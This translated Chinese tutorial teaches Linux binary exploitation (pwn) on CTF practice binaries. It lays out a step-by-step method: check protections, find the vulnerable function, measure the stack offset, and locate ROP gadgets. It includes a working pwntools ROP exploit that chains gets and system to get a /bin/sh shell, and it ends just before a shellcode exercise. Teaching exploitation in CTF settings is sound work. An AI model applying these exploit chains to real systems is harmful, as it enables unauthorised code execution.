# Linux pwn从入门到熟练（二）
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 前言
上回说到，如何利用程序中system函数以及bin/sh字符串来进行pwn。这里我们会介绍，如何在栈可执行而system函数以及参数没有的情况下，如何自己布置payload进行pwn。此外，还提供了一份可以参考的pwn套路，套路熟悉了，即可慢慢转化为熟悉。故此名曰：入门到熟练（二）。
## 练习题参考（利用库函数读取参数）
所谓的入门到熟练，套路还是要有的。套路有了，就可以见招拆招。我们一步一步来。
拿到题，我们需要依次查看：
  1. 检查保护情况
  2. 判断漏洞函数，如gets,scanf等
  3. 计算目标变量的在堆栈中距离ebp的偏移
  4. 分析是否已经载入了可以利用的函数，如system，execve等
  5. 分析是否有字符串/bin/sh
[Pwn4](https://github.com/desword/pwn_execrise/raw/master/pwn_basic_rop/pwn4)题目地址。
###  第一步，保护情况，
发现堆栈不可以执行，其他到还好。那么，我们在溢出时就需要再堆栈中部署的具有功能的地址，而不是具体的代码了。理解成堆栈中需要布置路线图，之后的程序按照这个路线图来执行。
反之，如果堆栈可以执行，我们就要思考如何布置shellcode，如何优化shellcode长度以及删除坏字符。（将在下一题的时候介绍）
###  第二步，检测漏洞函数。
发现是gets。这里分享一个ctf-pwn-tips，里面总结了很多的存在漏洞的函数，以及输入参数的描述，非常实用。[TIPS](https://github.com/Naetw/CTF-pwn-tips)
###  第三步，确认偏移量。
有几种方式。
我们可以直接从IDA的代码中分析出来，参数距离EBP的位置。如上述，看到距离ebp是0x64（100）个的字节，那么距离存放返回地址的偏移就是100+4=104个字节。但是，IDA的分析并不都是准确的，真正准确的位置，还是需要我们手动去调试。具体方法参考[Linux
PWN从入门到熟练](https://www.anquanke.com/post/id/164530)。这里简单整理一下步骤（假设linux程序在虚拟机guest执行，IDA在主机host执行）：
  1. 拷贝linux_server到guest的程序目录，并执行；
  2. IDA设置远程调试，并设置正确的guest IP和端口；
  3. IDA设置程序的断点在return，可以方便查看寄存器；
  4. 运行程序；
  5. 用脚本patternLocOffset.py创建偏移测试字符串，700字节度比如；
  6. 将产生的字符串在guest中输入；
  7. 查看host中IDA的ebp字符串；
  8. 在patternLocOffset.py中计算偏移
最终应该可以看到下面类似的结果。
    $ python patternLocOffset.py -l 700 -s 0x41366441
    [*] Create pattern string contains 700 characters ok!
    [*] No exact matches, looking for likely candidates...
    [+] Possible match at offset 108 (adjusted another-endian)
    [+] take time: 0.0004 s
发现实际的偏移是108个字节，覆盖点距离ebp。那么距离返回地址就应该是108+4=112字节。可见，IDA的分析有时是不准的，需要自己去测量。
###  第四步，分析可以利用的函数，
发现有system的：
###  第五步,查找是否有系统调用字符串：
    ROPgadget --binary ret2libc2 --string "/bin/sh"
    Strings information
    ============================================================
发现并没有字符串了，因此这里我们需要想个办法。
直观的想法是在shellcode中，在参数的位置直接放入字符串“/bin/sh”，比如下面这样：
    payload = flat(['a' * 112, system_plt, 0xabcdabcd, “/bin/sh”])
但是正如我们前面所说，放在堆栈中的是程序执行的路线图，而不是实际的程序或者字符串，因此，按照上述方式放置字符串，system并不会读取”/bin/sh”，而是读取”/bin/sh”对应的4个字节的地址所指向的内存空间，这个空间明显是不合法，因此就会导致利用失败。
怎么办呢？我们发现程序中还载入了函数gets，那么我们可以利用gets来读取用户输入的”/bin/sh”放置到某个地址空间去，接着system再调用它。“某个地址空间”可以是下面的buf2，可以发现它的地址是0x0804A080。这个空间可以让我们使用（感觉明显是CTF题留出来的位置=
=）
那么，我们的exp可以按照下面的方式安排：
    ##!/usr/bin/env python
    from pwn import *
    sh = process('./pwn4')
    shelf = ELF('./pwn4')
    gets_plt = shelf.plt['gets']
    system_plt = shelf.plt['system']
    pop_ebp = 0x0804872f
    buf2 = 0x804a080
    payload = flat(
    ['a' * 112, gets_plt, pop_ebp, buf2, system_plt, 0xabcdabcd, buf2])
    sh.sendline(payload)
    sh.sendline('/bin/sh')
    sh.interactive()
其中关键的代码是：
    payload = flat(
    ['a' * 112, gets_plt, pop_ebp, buf2, system_plt, 0xabcdabcd, buf2])
相信有的朋友会不明白，为啥有个[gets_plt, pop_ebp,
buf2]，这样的payload布置。Pop_ebp的主要目的是让eip流向system的位置，并且取出system地址赋值给eip。
Pop_ebp其实不一定是pop
ebp，pop任何其他的寄存器都可以，主要是利用该指令的esp+4的功能。比如，我们可以找到如下的位置，其中0x0804872f，0x0804843d都可以让它esp+4操作一次就好，操作多了就流的多了，就不指向system地址了，注意我们这里还要求得要返回ret一下，这样才会实际的提取system的地址出来，赋值给eip：
    @ubuntu:~/ $ ROPgadget --binary pwn4 --only 'pop|ret'
    Gadgets information
    ============================================================
    0x0804872f : pop ebp ; ret
    0x0804872c : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
    0x0804843d : pop ebx ; ret
    0x0804872e : pop edi ; pop ebp ; ret
    0x0804872d : pop esi ; pop edi ; pop ebp ; ret
    0x08048426 : ret
    0x0804857e : ret 0xeac1
    Unique gadgets found: 7
未来更清楚一些，画了一个图，其中序号的顺序表示，对应的命令执行完之后，esp对应的位置。
## 第一题（堆栈直接执行shellcode）
接下来这题，我们再轻松一点，可以直接在堆栈中执行程序。
[pwn5](https://github.com/desword/pwn_execrise/raw/master/pwn_basic_rop_2/%20pwn5)
继续前面的套路。
###  第一步，查看保护
发现，可以直接在堆栈上执行程序了，开启的是PIE，地址随机化的保护。
###  第二步，判断漏洞函数。
发现函数是read，仅仅读取0x40（64）个字节。
###  第三步，计算目标变量的在堆栈中距离ebp的偏移
EBP的内容为：0x3761413661413561
    $ python patternLocOffset.py -l 700 -s 0x3761413661413561
    [*] Create pattern string contains 700 characters ok!
    [*] No exact matches, looking for likely candidates...
    [+] Possible match at offset 16 (adjusted another-endian)
    [+] take time: 0.0005 s
距离EBP的偏移是16个字节，距离存放的返回地址是16+8=24个字节。
这里可以发现IDA分析的又是正确的了，0x10个字节。
###  第四步和第五步，分析是否已经载入了可以利用的函数，
如system，execve等
发现，并没有上述函数。但是由于堆栈可以执行，因此我们可以考虑直接将shellcode阻止在payload里面。因此，这里和第五步分析是否有字符串/bin/sh合并了，我们可以自己放置字符串，并且调用对应的地址了。